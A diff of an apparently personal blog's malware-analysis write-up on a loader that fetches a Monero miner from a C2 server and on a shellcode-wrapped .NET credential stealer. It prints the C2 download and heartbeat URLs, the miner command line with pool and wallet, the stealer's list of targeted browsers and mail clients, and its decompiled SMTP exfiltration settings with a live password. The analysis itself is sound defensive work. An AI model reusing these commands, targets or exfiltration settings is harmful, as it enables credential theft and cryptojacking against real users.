@@ -220,12 +220,13 @@ DllCall($cwipirw, $xkitfxhddsbtsyuxw, $rjhkweazp, $fosxprdysmayinrykddwmelktkhpm
 <li>Checks if a file named "paygab" exists in %LOCALAPPDATA%, if so, xor it with "0x60" and execute it.</li>
 <li>if paygab doesn't exist, downloads "http://176.98.187.46:1778/miner" and executes it.</li>
 <li>miner will check if "sigverif.exe" is running, if so terminates it.</li>
+<li>Opens new "sigverif.exe" process, allocates space, writes the open source project named <a href="https://github.com/xmrig/xmrig">xmrig</a> to be able to mine.</li>
 <li>Executes command:</li>
 </ol>
 <pre><code class="language-cmd">C:\\Windows\\System32\\sigverif.exe --algo=rx/0 --url=gulf.moneroocean.stream:10001 --user=47GrvVWRXX9CbpQ7WKAqR1fP1fEYJpurvj8pAkF8FcgcUJTFi5KpTAmWxv4modTHTMNXZXSxa8K8SijdVHDiAUs69xgSt MY --pass=x --threads=2"
 </code></pre>
-<p>(I am providing the commands but please don't run them unless you want to donate to the malware developer)</p>
-<ol start="8">
+<p>NOTE: This is new malware sample, as I was first person to submit this sample to <a href="https://www.virustotal.com/gui/file/0f0e64df4d5df47d5052c69e726ca0724af00192828e32e5f93fed5bc9fe61a4">virustotal</a> and <a href="https://bazaar.abuse.ch/sample/0f0e64df4d5df47d5052c69e726ca0724af00192828e32e5f93fed5bc9fe61a4/">malware bazaar</a></p>
+<ol start="9">
 <li>Going back to "nwekwowlwhwcogczoft", after trying these things, it checks status of our machine by using InternetOpenUrl API "http://176.98.187.46:1778/heartbeat?userID=xxxx-xxxxx-xxxxx-xxxx" (userID is your machine GUID that got fetched by this executable before from registry) and using InternetReadFile API to check if there is any new command given by C2, as I said there are 3 commands "stealer"/"custom" (same thing), "exit", "update".</li>
 <li>why "stealer/custom" can be given? because the one we downloaded before was actually decoy and size was lower than required. (why do this? to hide their project).</li>
 <li>other 2 "exit" and "update" are obvious, what they are.</li>
@@ -233,11 +234,90 @@ DllCall($cwipirw, $xkitfxhddsbtsyuxw, $rjhkweazp, $fosxprdysmayinrykddwmelktkhpm
 <p>There is a few possible case in our situation:</p>
 <ol>
 <li>the fake stealer is to take time of reverse engineers/malware analysts.</li>
-<li>it only gives real stealer to trusted (real victim machines by looking at their behaviour), for example I acted different than usual machines while analysing, requesting file a lot of times without checking heartbeat etc.</li>
+<li>it only gives real stealer to trusted (real victim machines by looking at their behaviour), for example I acted different than usual machines while analysing, requesting file a lot of times without checking heartbeat etc. or the attacker itself chooses which machines to send the real stealer. (most realistic case)</li>
 </ol>
 <p>This was end of the "nwekwowlwhwcogczoft" executable.</p>
 <p>The real deal was actually, "sqNnY.bin". Fun part is, I actually thought this is trash code to take our time but it is actually, the main part of the malware. After "xor"-ing it with the key even after you check the file type, it says "not a PE file". Also there is no "MZ" at the first 2 bytes of file. After a little, let' say "OSINT", I found out the "pe to shellcode" project was used for doing this: <a href="https://github.com/hasherezade/pe_to_shellcode">pe_to_shellcode</a>. A free but powerful project.</p>
 <p>"The goal of this project is to provide a possibility to generate PE files that can be injected with minimal effort. It is inspired by Stephen Fewer's <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">ReflectiveDLLInjection</a> - but the difference is that with pe2shc you can add the reflective loading stub post-compilation. Also, the header of the PE file is modified in such a way, that you can start executing the injected buffer from the very beginning - just like you would do with a shellcode. It will automatically find the stub, and continue loading the full PE."</p>
+<p>The point is, it really makes 0 sense when you look at the file, it is just a bunch of bytes. There is literally not a single string, not even "This program cannot be run in DOS mode" (because it is shellcode not PE). But the thing is, it is possible to manually extract malware. It was not that hard as I could find some APIs used by shellcode, like VirtualAlloc, memset, etc.</p>
+<p>I could extract malware and check in virustotal, if the malware is submited before and I was the first person to submit it too. <a href="https://bazaar.abuse.ch/sample/038c357a30a4634ec309f1622ce91c25a18511689518c926080643b0d07ae008/#yara">malware bazaar</a> and <a href="https://www.virustotal.com/gui/file/038c357a30a4634ec309f1622ce91c25a18511689518c926080643b0d07ae008/detection">virustotal</a></p>
+<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_8/4.png?raw=true" alt="1|1000" /></p>
+<p>It is .NET 32-bit executable with 0 encryption. and the funny part is malware developers choose this as their signature:</p>
+<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_8/3.png?raw=true" alt="1|700" /></p>
+<p>As it is not encrypted or anything I will just basically list what is can does and end it here:</p>
+<ol>
+<li>
+<p>Checks if user (victim) is expired by comparing time to "2025-02-15" (if yes exit)</p>
+</li>
+<li>
+<p>runs through 3 empty functions, probably not implemented by malware dev for now:
+            UltraSpeed.Taskmgr_Disabler();
+            UltraSpeed.CMD_Disabler();
+            UltraSpeed.Registeries_Disabler();</p>
+</li>
+<li>
+<p>Tries to steal data from these browsers:</p>
+</li>
+</ol>
+<pre><code>Chrome_Speed
+Torch_Speed
+CocCoc_Speed
+QQ_Speed
+xVast_Speed
+QIPSurf_Speed
+Microsoft_Speed
+Chromium_Speed
+Blisk_Speed
+Brave_Speed
+Nichrome_Speed
+Kometa_Speed
+Superbird_Speed
+Opera_Speed
+Comodo_Speed
+Cent_Speed
+Chedot_Speed
+Ghost_Speed
+Iron_Speed
+UC_Speed
+BlackHawk_Speed
+Citrio_Speed
+Uran_Speed
+Falkon_Speed
+Sputnik_Speed
+CoolNovo_Speed
+Chrome_Canary_Speed
+Sleipnir_Speed
+Kinzaa_Speed
+Amigo_Speed
+Epic_Speed
+e360_English_Speed
+e360_China_Speed
+Vivaldi_Speed
+Xpom_Speed
+orbitum_Speed
+Iridium_Speed
+SevinStar_Speed
+Outlook_Speed
+Foxmail_Speed
+FireFox
+SeaMonkey
+IceDragon
+Thunderbird
+FileZilla_Speed
+WindowsKey_Speed
+</code></pre>
+<ol start="4">
+<li>sends these data using these:</li>
+</ol>
+<pre><code>private static string TheInfo = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(UltraSpeed.StrSignature + " \r\n\r\n\r\n==========PC INFO==========\r\nClient Name:" + Environment.MachineName, Operators.AddObject("\r\nFullDate: ", UltraSpeed.INFO_Date_Time())), "\r\nIP: " + UltraSpeed.INFO_SystemIP()), Operators.AddObject(Operators.AddObject(Operators.AddObject("\r\nCountry: ", UltraSpeed.INFO_Country()), "\r\n"), "==========PC INFO==========")));
+private static string Host_Sender = "voiper@tamre.it";
+private static string Host_Password = "KFRKgMrNoiIF";
+private static string Host_Server = "mailserver12.vhosting-it.com";
+private static string Host_Receiver = "remiset@remisat.com.uy";
+private static string Host_Port = "465";
+</code></pre>
+<p>NOTE: the data I am talking about is usernames and passwords.</p>
+<p>That is all for this analysis.</p>
 
                     </main>
 
